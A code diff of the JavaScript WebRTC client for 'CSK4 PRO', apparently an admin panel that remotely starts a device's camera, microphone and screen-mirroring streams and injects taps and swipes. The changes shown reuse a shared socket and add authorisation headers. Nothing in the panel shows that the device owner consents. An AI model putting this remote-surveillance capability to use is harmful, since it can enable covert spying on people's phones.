@@ -1,6 +1,8 @@
 // ============================================
-// CSK4 PRO - WebRTC Client
-// Camera Stream + Audio Stream + Screen Mirror
+// CSK4 PRO v4.1 - WebRTC Client (FIXED)
+// ============================================
+// Fix: Reuse existing socket from app.js
+//      Don't create second connection
 // ============================================
 
 let peerConnection = null;
@@ -9,12 +11,16 @@ let webrtcSocket = null;
 let pendingIceCandidates = [];
 let isScreenMirror = false;
 
-// ============ SOCKET INIT ============
+// ✅ FIXED: reuse existing socket
 function initWebRTCSocket() {
   if (webrtcSocket) return;
-  webrtcSocket = io();
+  // Use the socket created by app.js
+  if (window.socket) {
+    webrtcSocket = window.socket;
+  } else {
+    webrtcSocket = io();
+  }
 
-  // Camera/audio stream answer
   webrtcSocket.on('webrtc-answer', async (data) => {
     try {
       if (peerConnection && data.signal) {
@@ -23,8 +29,6 @@ function initWebRTCSocket() {
         );
         const status = document.getElementById(isScreenMirror ? 'screenStatus' : 'liveStatus');
         if (status) status.textContent = '🔴 LIVE';
-        
-        // Process pending ICE candidates
         for (const c of pendingIceCandidates) {
           try { await peerConnection.addIceCandidate(c); } catch (e) {}
         }
@@ -33,7 +37,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('Answer error:', e); }
   });
 
-  // Screen mirror answer
   webrtcSocket.on('screen-mirror-answer', async (data) => {
     try {
       if (peerConnection && data.signal) {
@@ -42,7 +45,6 @@ function initWebRTCSocket() {
         );
         const status = document.getElementById('screenStatus');
         if (status) status.textContent = '🔴 MIRRORING';
-        
         for (const c of pendingIceCandidates) {
           try { await peerConnection.addIceCandidate(c); } catch (e) {}
         }
@@ -51,7 +53,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('Screen answer error:', e); }
   });
 
-  // ICE for camera
   webrtcSocket.on('webrtc-ice', async (data) => {
     try {
       if (!data.signal) return;
@@ -68,7 +69,6 @@ function initWebRTCSocket() {
     } catch (e) { console.error('ICE error:', e); }
   });
 
-  // ICE for screen
   webrtcSocket.on('screen-mirror-ice', async (data) => {
     try {
       if (!data.signal) return;
@@ -105,7 +105,6 @@ function startLiveStream(deviceId, type = 'camera') {
     ]
   });
 
-  // Receive tracks
   peerConnection.ontrack = (event) => {
     const video = document.getElementById('liveVideo');
     const audio = document.getElementById('liveAudio');
@@ -155,10 +154,9 @@ function startLiveStream(deviceId, type = 'camera') {
       signal: peerConnection.localDescription
     });
 
-    // Trigger device to start stream
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: authHeaders(),
       body: JSON.stringify({
         deviceId,
         command: type === 'audio' ? 'start_audio_stream' : 'start_webrtc'
@@ -184,7 +182,7 @@ function stopLiveStream(silent = false) {
   if (currentStreamDevice && !silent && !isScreenMirror) {
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: authHeaders(),
       body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_webrtc' })
     });
   }
@@ -199,12 +197,12 @@ function switchCamera() {
   if (!currentStreamDevice) { alert('Pehle stream start karein'); return; }
   fetch('/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId: currentStreamDevice, command: 'switch_camera' })
   }).then(() => toast('🔄 Camera switched'));
 }
 
-// ============ SCREEN MIRROR (MediaProjection) ============
+// ============ SCREEN MIRROR ============
 function startScreenMirror(deviceId) {
   if (!deviceId) { alert('Device select karein'); return; }
   stopLiveStream(true);
@@ -258,10 +256,9 @@ function startScreenMirror(deviceId) {
       signal: peerConnection.localDescription
     });
 
-    // Trigger device to start screen mirror
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: authHeaders(),
       body: JSON.stringify({ deviceId, command: 'start_screen_mirror' })
     });
 
@@ -282,7 +279,7 @@ function stopScreenMirror(silent = false) {
   if (currentStreamDevice && !silent && isScreenMirror) {
     fetch('/api/admin/command', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: authHeaders(),
       body: JSON.stringify({ deviceId: currentStreamDevice, command: 'stop_screen_mirror' })
     });
   }
@@ -298,21 +295,18 @@ function stopScreenMirror(silent = false) {
 function sendTouch(action, x = 0.5, y = 0.5) {
   const deviceId = document.getElementById('screenDevice')?.value || currentStreamDevice;
   if (!deviceId) { alert('Device select karein'); return; }
-  
   let command = 'touch_tap';
   if (action === 'swipe') command = 'touch_swipe';
   if (action === 'back') command = 'touch_back';
   if (action === 'home') command = 'touch_home';
   if (action === 'recent') command = 'touch_recent';
-  
   fetch('/api/admin/command', {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: authHeaders(),
     body: JSON.stringify({ deviceId, command, params: { x, y } })
   }).then(() => toast('👆 Touch: ' + action));
 }
 
-// ============ VIDEO CLICK FOR TAP ============
 document.addEventListener('click', (e) => {
   const screenVideo = document.getElementById('screenVideo');
   if (screenVideo && e.target === screenVideo) {
@@ -323,12 +317,12 @@ document.addEventListener('click', (e) => {
   }
 });
 
-// ============ CLEANUP ============
 window.addEventListener('beforeunload', () => {
   if (peerConnection) {
     try { peerConnection.close(); } catch (e) {}
   }
-  if (webrtcSocket) {
+  // Don't disconnect webrtcSocket if it's the shared socket
+  if (webrtcSocket && webrtcSocket !== window.socket) {
     try { webrtcSocket.disconnect(); } catch (e) {}
   }
 });
